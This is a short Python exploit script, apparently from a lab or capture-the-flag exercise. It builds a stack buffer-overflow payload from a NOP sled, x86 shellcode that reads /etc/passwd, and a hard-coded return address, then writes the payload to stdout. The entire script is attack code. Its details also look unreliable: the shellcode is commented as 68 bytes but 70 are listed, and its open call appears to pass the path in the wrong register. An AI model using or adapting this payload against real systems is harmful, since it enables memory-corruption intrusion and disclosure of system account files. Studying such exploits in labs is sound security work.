import sys

# Shellcode para /etc/passwd (68 bytes)
shellcode = (b"\x31\xc0\x50\x68\x73\x73\x77\x64\x68\x2f\x70\x61\x73\x68\x2f\x65"
             b"\x74\x63\x89\xe6\x31\xd2\x66\xba\xff\x0f\xb0\x05\xcd\x80\x89\xc3"
             b"\x31\xc0\xb0\x03\x89\xe7\x31\xd2\x66\xba\xff\x0f\xcd\x80\x31\xc0"
             b"\xb0\x04\x31\xdb\x89\xf9\x89\xea\x66\xba\xff\x0f\xcd\x80\x31\xc0"
             b"\xb0\x01\x31\xdb\xcd\x80")

shellcode_len = len(shellcode)  # 68 bytes
NOP_sled_len = 140 - shellcode_len # 72 bytes de NOPs

# Dirección de Retorno más estable encontrada: 0xffffd3d0
EIP_target = b"\xd0\xd3\xff\xff"

sys.stdout.buffer.write(b"\x90" * NOP_sled_len + shellcode + EIP_target)
